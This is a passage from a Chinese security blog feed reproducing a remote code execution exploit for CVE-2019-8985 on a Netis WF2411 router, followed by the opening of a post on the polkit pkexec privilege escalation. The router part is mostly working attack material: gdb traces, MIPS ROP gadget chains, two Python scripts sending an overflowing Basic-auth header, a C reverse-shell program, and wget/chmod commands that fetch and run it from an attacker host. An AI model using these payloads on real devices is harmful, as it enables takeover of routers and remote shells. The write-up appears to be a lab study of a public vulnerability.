class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">  0x400000   0x419000 r-xp    19000 0      /bin/boa</span><br><span class="line">  0x459000   0x45a000 rw-p     1000 19000  /bin/boa</span><br><span class="line">  0x45a000   0x466000 rwxp     c000 0      [heap]</span><br><span class="line">0x77ee2000 0x77eee000 r-xp     c000 0      /lib/libgcc_s_4181.so.1</span><br><span class="line">0x77eee000 0x77f2d000 ---p    3f000 0      [anon_77eee]</span><br><span class="line">0x77f2d000 0x77f2e000 rw-p     1000 b000   /lib/libgcc_s_4181.so.1</span><br><span class="line">0x77f2e000 0x77f6c000 r-xp    3e000 0      /lib/libc.so.0</span><br><span class="line">0x77f6c000 0x77fac000 ---p    40000 0      [anon_77f6c]</span><br><span class="line">0x77fac000 0x77fad000 rw-p     1000 3e000  /lib/libc.so.0</span><br><span class="line">0x77fad000 0x77fb1000 rw-p     4000 0      [anon_77fad]</span><br><span class="line">0x77fb1000 0x77fb7000 r-xp     6000 0      /lib/ld-uClibc.so.0</span><br><span class="line">0x77ff5000 0x77ff6000 rw-p     1000 0      [anon_77ff5]</span><br><span class="line">0x77ff6000 0x77ff7000 r--p     1000 5000   /lib/ld-uClibc.so.0</span><br><span class="line">0x77ff7000 0x77ff8000 rw-p     1000 6000   /lib/ld-uClibc.so.0</span><br><span class="line">0x7f9ee000 0x7fff7000 rwxp   609000 0      [stack]</span><br><span class="line">0x7fff7000 0x7fff8000 r-xp     1000 0      [vdso]</span><br></pre></td></tr></table></figure><p>gdb 定位到地址<br><img src="/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220718180751.png" alt><br>可以看到由于 boa 的限制 ✨TODO<br> 我们只溢出了 17 个 cmd 的字节命令<br>而 cmd 需要放在 <code>0x40800368</code>  的位置 也就是 esp + 0x18  <code>0x40800350 + 0x18</code></p><p>从这一段可以看出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► 0x4146dc &lt;user_ok+460&gt;    lw     $ra, 0x74($sp)                &lt;0x4146cc&gt;</span><br><span class="line">  0x4146e0 &lt;user_ok+464&gt;    lw     $s4, 0x70($sp)</span><br><span class="line">  0x4146e4 &lt;user_ok+468&gt;    lw     $s3, 0x6c($sp)</span><br><span class="line">  0x4146e8 &lt;user_ok+472&gt;    lw     $s2, 0x68($sp)</span><br><span class="line">  0x4146ec &lt;user_ok+476&gt;    lw     $s1, 0x64($sp)</span><br><span class="line">  0x4146f0 &lt;user_ok+480&gt;    lw     $s0, 0x60($sp)</span><br><span class="line">  0x4146f4 &lt;user_ok+484&gt;    jr     $ra</span><br></pre></td></tr></table></figure><p>ra 在 sp + 0x74 的位置<br>而 jr 之前会做一次 <code>.text:004146F8                 addiu   $sp, 0x78</code> <br> 而 gadget 里的 cmd 地址是 <code>addiu   $a0, $sp, 0x20+var_8</code> <br> 也就是放在 ra 上  <code>0x78 - 0x74 + 0x18</code>  =  <code>0x1c</code>  的位置</p><p>exp 如下<br> s3 的位置是 <code>sp + 0x6c</code>  溢出点离 s0 是  <code>0x40</code> <br> 所以溢出点离 s3 是 <code>0x4c</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">libc   = <span class="number">0x77f2e000</span> </span><br><span class="line">libgcc = <span class="number">0x77ee2000</span></span><br><span class="line">gadget = <span class="number">0x0000ABD0</span> + libgcc</span><br><span class="line">system= <span class="number">0x0002AC90</span> + libc</span><br><span class="line">MAXSZ= <span class="number">1024</span></span><br><span class="line"><span class="comment"># cmd= b&quot;FUCK&quot; * 50 # 看看长度</span></span><br><span class="line">cmd= <span class="string">b&quot;mkdir hack&quot;</span></span><br><span class="line">context(arch = <span class="string">&quot;mips&quot;</span>, endian = <span class="string">&quot;big&quot;</span>, os = <span class="string">&quot;Linux&quot;</span>, log_level = <span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"><span class="comment"># fork 0x77f34d30</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] gadget is <span class="subst">&#123;<span class="built_in">hex</span>(gadget)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] system is <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">payload  = <span class="string">b&#x27;a:%s&#x27;</span> %(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x4C</span> - <span class="number">2</span>)) <span class="comment"># padding + s0~s2</span></span><br><span class="line">payload += p32(system)<span class="comment"># s3 &lt;- esp + 0x0c</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAA&#x27;</span><span class="comment"># s4 </span></span><br><span class="line">payload += p32(gadget) <span class="comment"># ra &lt;- esp + 0x14</span></span><br><span class="line">payload += <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">payload += cmd  <span class="comment">#  &lt;- esp + 0x30</span></span><br><span class="line"></span><br><span class="line">header   = <span class="string">b&#x27;GET / HTTP/1.1\r\n&#x27;</span></span><br><span class="line"><span class="comment"># header  += b&#x27;Host: 127.0.0.1:80\r\n&#x27;</span></span><br><span class="line">header  += <span class="string">b&#x27;Host: 10.10.10.1:80\r\n&#x27;</span></span><br><span class="line">header  += <span class="string">b&#x27;Authorization: Basic %s\r\n&#x27;</span> % base64.b64encode(payload)</span><br><span class="line">header  += <span class="string">b&#x27;User-Agent: Real UserAgent\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">iport = (<span class="string">&quot;10.10.10.1&quot;</span> ,<span class="number">80</span>)</span><br><span class="line"><span class="comment"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class="line">s.connect(iport)</span><br><span class="line">s.send(header)</span><br><span class="line">msg = s.recv(MAXSZ)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>gdb 调试脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set arch mips</span><br><span class="line">set endian big</span><br><span class="line">set solib-search-path sqrootfs/lib/</span><br><span class="line">b *0x4146f4</span><br><span class="line">target remote 10.10.10.1:8888</span><br></pre></td></tr></table></figure><p>程序是 chroot 到 /web 页面下了 所以 mkdir 是在 web 下<br><img src="/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/2.png" alt></p><p>17 个字节的溢出是很难造成反向 shell 的 也就只能造成一次 17 字节的任意命令执行<br>重新考虑 rop</p><h2 id="更好的rop"><a class="markdownIt-Anchor" href="#更好的rop">#</a> 更好的 ROP</h2><p>目标 让最后的 a0 尽可能的接近 sp 的位置<br>已知在 vuln 函数最后 jalr ra 之后 sp 是在 ra 上 4 字节</p><h3 id="gadget2"><a class="markdownIt-Anchor" href="#gadget2">#</a> gadget2</h3><p>从 ra 开始到 cmd 结束 有 40 个字节的空区<br>要充分利用这 40 字节 就需要降低 esp<br> 在 libc 中找到此 gadget<br> <code>sp - 0x38 + 0x30 - 0x18 = sp - 0x20</code>  的值给 <code>a0</code>  寄存器<br>然后跳到 先前的 <code>a0</code>  里面去<br>但是有个问题  <code>sp-0x20</code>  是在 saved 寄存器存放的地方 肯定是很难布置过长的 cmd<br> 而且 <code>a0</code>  不可控 我们需要让 <code>a0</code>  可控</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00020650                 addiu   $sp, -0x38</span><br><span class="line">.text:00020654                 sw      $ra, 0x30+var_s0($sp)</span><br><span class="line">.text:00020658                 sw      $gp, 0x30+var_20($sp)</span><br><span class="line">.text:0002065C                 li      $v0, 2</span><br><span class="line">.text:00020660                 move    $t9, $a0</span><br><span class="line">.text:00020664                 sw      $v0, 0x30+var_18($sp)</span><br><span class="line">.text:00020668                 jalr    $t9</span><br><span class="line">.text:0002066C                 addiu   $a0, $sp, 0x30+var_18</span><br></pre></td></tr></table></figure><h3 id="gadget1"><a class="markdownIt-Anchor" href="#gadget1">#</a> gadget1</h3><p>而这个 gadget 依靠 <code>a0</code>  进行跳转 我们需要控制 <code>a0</code> <br>libgcc 中<br>我们可以控制 <code>a0</code>  也可以控制跳转地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00008B20                 move    $t9, $s4</span><br><span class="line">.text:00008B24                 jalr    $t9 ; sub_8770</span><br><span class="line">.text:00008B28                 move    $a0, $s0</span><br></pre></td></tr></table></figure><h3 id="gadget3"><a class="markdownIt-Anchor" href="#gadget3">#</a> gadget3</h3><p>同时 栈下去了 影响到我们的 s 寄存器列了 需要抬上来<br>之前 <code>sp</code>  减去了  <code>0x38</code>  那么这里 + 上 <code>0x1c</code>  的地方可以布置下一个 rop 并把 sp 加上来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.init:000017A4                 lw      $ra, 0x1C+var_s0($sp)</span><br><span class="line">.init:000017A8                 nop</span><br><span class="line">.init:000017AC                 jr      $ra</span><br><span class="line">.init:000017B0                 addiu   $sp, 0x20</span><br></pre></td></tr></table></figure><h3 id="gadget4"><a class="markdownIt-Anchor" href="#gadget4">#</a> gadget4</h3><p>最后 通过 sp 加上 <code>0x18</code>  的位置将 sp 回复到之前的 sp 一样的地址 并 jalr 到 s3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class="line">.text:0000ABD4                 move    $a1, $s2</span><br><span class="line">.text:0000ABD8                 move    $s0, $zero</span><br><span class="line">.text:0000ABDC                 move    $t9, $s3</span><br><span class="line">.text:0000ABE0                 jalr    $t9</span><br><span class="line">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure><h3 id="流程图"><a class="markdownIt-Anchor" href="#流程图">#</a> 流程图</h3><p><img src="/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/liucheng.png" alt></p><h3 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch = <span class="string">&quot;mips&quot;</span>, endian = <span class="string">&quot;big&quot;</span>, os = <span class="string">&quot;Linux&quot;</span>, log_level = <span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc    = <span class="number">0x77f2e000</span> </span><br><span class="line">libgcc = <span class="number">0x77ee2000</span></span><br><span class="line">system= <span class="number">0x0002AC90</span> + libc</span><br><span class="line">gadgets  = [<span class="number">0</span> ,<span class="number">0x00008B20</span> ,<span class="number">0x00020650</span> ,<span class="number">0x000017A4</span> ,<span class="number">0x0000ABD0</span>]</span><br><span class="line">MAXSZ   = <span class="number">1024</span></span><br><span class="line">cmd= <span class="string">b&quot;echo &#x27;hacked&#x27; &gt; CrimeStatement&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">rop = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x + libgcc,gadgets))</span><br><span class="line">rop[<span class="number">2</span>] = rop[<span class="number">2</span>] - libgcc + libc</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] rop[<span class="subst">&#123;i&#125;</span>] is <span class="subst">&#123;<span class="built_in">hex</span>(rop[i])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] system is <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;a:%s&#x27;</span> %(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x3C</span> - <span class="number">2</span>))</span><br><span class="line">payload += p32(rop[<span class="number">4</span>])<span class="comment"># </span></span><br><span class="line">payload += p32(rop[<span class="number">3</span>])<span class="comment"># s0</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAA&#x27;</span><span class="comment"># s1 </span></span><br><span class="line">payload += <span class="string">b&#x27;CCCC&#x27;</span> <span class="comment"># s2</span></span><br><span class="line">payload += p32(system)<span class="comment"># s3</span></span><br><span class="line">payload += p32(rop[<span class="number">2</span>])<span class="comment"># s4</span></span><br><span class="line">payload += p32(rop[<span class="number">1</span>])<span class="comment"># ra</span></span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line">header   = <span class="string">b&#x27;GET / HTTP/1.1\r\n&#x27;</span></span><br><span class="line"><span class="comment"># header  += b&#x27;Host: 127.0.0.1:80\r\n&#x27;</span></span><br><span class="line">header  += <span class="string">b&#x27;Host: 10.10.10.1:80\r\n&#x27;</span></span><br><span class="line">header  += <span class="string">b&#x27;Authorization: Basic %s\r\n&#x27;</span> % base64.b64encode(payload)</span><br><span class="line">header  += <span class="string">b&#x27;User-Agent: Real UserAgent\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">iport = (<span class="string">&quot;10.10.10.1&quot;</span> ,<span class="number">80</span>)</span><br><span class="line"><span class="comment"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class="line">s.connect(iport)</span><br><span class="line">s.send(header)</span><br><span class="line">msg = s.recv(MAXSZ)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719174740.png" alt></p><h2 id="做点坏事"><a class="markdownIt-Anchor" href="#做点坏事">#</a> 做点坏事</h2><p>既然都拿下了这么长的 cmd<br> 那么不做点坏事也说不过去<br> busybox 中没有 <code>nc</code>  也没有 <code>bash -i</code>  之类的东西给我们做反向 shell</p><p>但是有 <code>wget</code>  下载恶意程序并运行</p><p>编写恶意程序 <code>malware</code>  (✨TODO 修改参数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"><span class="type">int</span> port = atoi(argv[<span class="number">2</span>]);</span><br><span class="line"><span class="type">char</span>* ip = argv[<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span> =</span> &#123;</span><br><span class="line">.sin_family = AF_INET,</span><br><span class="line">.sin_port = htons(port),</span><br><span class="line">.sin_addr.s_addr = inet_addr(ip),</span><br><span class="line">&#125;;</span><br><span class="line">connect(sd, (<span class="keyword">struct</span> sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> _ = <span class="number">0</span>; _ &lt;= <span class="number">2</span>; _++) </span><br><span class="line">dup2(sd, _);</span><br><span class="line">execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gnu-gcc -static -mabi=32 -o malware malware.c</span><br></pre></td></tr></table></figure><p>我们需要利用两次漏洞 一次让 malware 可执行 一次让其跑起来（因为长度不够 没法一次性解决）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.10.2:8000/malware</span><br><span class="line">chmod +x malware</span><br><span class="line">./malware 10.10.10.2 9999</span><br></pre></td></tr></table></figure><p>攻击机开启监听<br>效果如下 成功 getshell<br><img src="/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719182949.png" alt></p><h2 id="未完"><a class="markdownIt-Anchor" href="#未完">#</a> 未完</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  squrootfs grep -r &quot;Authorization: Basic &quot; .</span><br><span class="line">Binary file ./bin/updatedd matches</span><br><span class="line">Binary file ./bin/busybox matches</span><br><span class="line">grep: ./var/run/webs.pid: Permission denied</span><br><span class="line">➜  squrootfs grep -r &quot;User-Agent: Real UserAgent&quot; .</span><br><span class="line">grep: ./var/run/webs.pid: Permission denied</span><br><span class="line">➜  squrootfs grep -r &quot;User-Agent: &quot; .              </span><br><span class="line">Binary file ./bin/updatedd matches</span><br><span class="line">Binary file ./bin/busybox matches</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#环境搭建&quot;&gt;#&lt;/a&gt; 环境搭建&lt;/h2&gt;
&lt;p&gt;固件获取  &lt;a href=&quot;https://www.netis-systems.com/Suppory/de_details/i</summary>
      
    
    
    
    <category term="CVE recur" scheme="https://squirre17.github.io/categories/CVE-recur/"/>
    
    
    <category term="IoT" scheme="https://squirre17.github.io/tags/IoT/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-4030 polkit-pkexec 本地提权分析</title>
    <link href="https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
    <id>https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</id>
    <published>2021-08-10T16:00:00.000Z</published>
    <updated>2021-08-10T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考"><a class="markdownIt-Anchor" href="#参考">#</a> 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-271423.htm">看雪大爹</a></li><li><a href="https://trganda.github.io/posts/iconv/">GCONV_PATH 利用</a></li><li><a href="https://blog.csdn.net/qq_42303523/article/details/117911859#:~:text=linux%E7%B3%BB%E7%BB%9F%E6%8F%90,%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%BC%9A%E5%A6%82%E4%B8%8B%EF%BC%9A">GCONV_PATH 利用 2</a></li><li><a href="https://zhuanlan.zhihu.com/p/470224218?utm_source=qq&amp;utm_medium=social&amp;utm_oi=949109417673797632">合天</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MTY0MDc1Mw==&amp;mid=2247484520&amp;idx=1&amp;sn=b9fdfa0c5cc802478a541964a0d5b2c2&amp;chksm=ce154536f962cc20db00097e2b0f4cc155aefb25e54dbc31af29733be6ecf9ba21d3fd77b908&amp;mpshare=1&amp;scene=23&amp;srcid=0301ZZXX7YvmTLBFW02HGXd5&amp;sharer_sharetime=1646130648823&amp;sharer_shareid=35c6bdd49b9ea011edbc171a217d1072#rd">天玄实验室</a></li><li><a href="https://www.anquanke.com/post/id/267774#h3-2">安全客</a></li><li><a href="https://www.wt37.cn/5949.html">少羽</a></li></ul><h2 id="软件简介"><a class="markdownIt-Anchor" href="#软件简介">#</a> 软件简介</h2><p><a href="https://gitlab.freedesktop.org/polkit/polkit/">https://gitlab.freedesktop.org/polkit/polkit/</a></p><blockquote><p>polkit is a toolkit for defining and handling authorizations. It is used for allowing unprivileged processes to speak to privileged processes.</p></blockquote><p>pkexec 是 polkit 是一个程序，polkit 负责不同特权级的进程间的通讯<br> <code>pkexec echo &quot;1&quot;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --help</span><br><span class="line">pkexec --version |</span><br><span class="line">       --help |</span><br><span class="line">       --disable-internal-agent |</span><br><span class="line">       [--user username] PROGRAM [ARGUMENTS...]</span><br><span class="line"></span><br><span class="line">See the pkexec manual page for more details.</span><br></pre></td></tr></table></figure><h2 id="环境"><a class="markdownIt-Anchor" href="#环境">#</a> 环境</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --version</span><br><span class="line">pkexec version 0.105</span><br><span class="line">squ@squ-virtual-machine:~/tools/modules-5.0.1$ uname -a</span><br><span class="line">Linux squ-virtual-machine 5.11.0-46-generic #51~20.04.1-Ubuntu SMP Fri Jan 7 06:51:40 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><p>docker：<br>pull 个 debian 下来，然后设置共享卷</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name=de -v /home/squ/docker_volumn:/home/vol debian /bin/bash</span><br></pre></td></tr></table></figure><h2 id="下载源码"><a class="markdownIt-Anchor" href="#下载源码">#</a> 下载源码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/Desktop/cve/policykit-1-0.105$ dpkg -S /usr/bin/pkexec</span><br><span class="line">policykit-1: /usr/bin/pkexec</span><br></pre></td></tr></table></figure><p><code>dpkg</code>  查看包为 <code>policykit-1</code> <br> <code>sudo apt source policykit-1</code>  或者<br><a href="https://launchpad.net/ubuntu/bionic/+package/policykit-1"> https://launchpad.net/ubuntu/bionic/+package/policykit-1</a><br> 影响版本 <code>0~0.105</code></p><p>下载后路径在 <code>/home/squ/Desktop/cve/policykit-1-0.105/src/programs/pkexec.c</code></p><h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建">#</a> 环境搭建</h2><p>源码地址<br><a href="https://gitlab.freedesktop.org/polkit/polkit"> https://gitlab.freedesktop.org/polkit/polkit</a><br> 基本找个虚拟机就能打，真是太 coooooooooooooooooooooooooooool 了<br> docker<br> 如果遇到了 <code>hash mismatch</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E: Failed to fetch http:<span class="comment">//deb.debian.org/debian/pool/main/b/binutils/binutils-common_2.35.2-2_amd64.deb  Hash Sum mismatch</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean  </span><br><span class="line">apt-get update --fix-missing </span><br></pre></td></tr></table></figure><p>如果还是不行就换源 <code>/etc/apt/sources.list</code> (debian)<br> 再不行就关代理吧（关了就好了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib 